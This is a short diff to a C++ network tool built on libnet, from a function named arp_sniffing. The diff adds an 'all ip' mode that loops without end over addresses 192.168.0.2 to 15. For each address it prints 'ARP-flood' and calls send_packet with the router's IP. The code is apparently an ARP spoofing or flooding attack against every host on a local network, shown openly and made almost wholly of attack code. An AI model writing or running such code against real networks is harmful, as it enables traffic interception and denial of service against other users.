@@ -1,4 +1,5 @@
 #include <arpa/inet.h>
+#include <cstdio>
 #include <cstring>
 #include <iostream>
 #include <libnet.h>
@@ -73,7 +74,7 @@ int arp_sniffing() {
   std::string victim_ip_str = "";
 
   std::cout << "  [ 1 ] - input ip" << std::endl;
-  std::cout << "  [ 2 ] - all ip" << std::endl;
+  std::cout << "  [ 2 ] - all ip [16]" << std::endl;
   std::cout << "  input: ";
   std::cin >> style;
 
@@ -88,7 +89,15 @@ int arp_sniffing() {
     }
   }
   case 2: {
-    std::cout << "  ..." << std::endl;
+    while (true) {
+      for (int i = 2; i < 16; i++) {
+        char ip[16];
+        snprintf(ip, sizeof(ip), "192.168.0.%d", i);
+        std::cout << "  \033[38;5;196mARP-flood:\t" << router_ip_str << " </3 "
+                  << ip << "..." << "\033[0m" << std::endl;
+        send_packet(router_ip_str, ip);
+      }
+    }
   }
   }
 
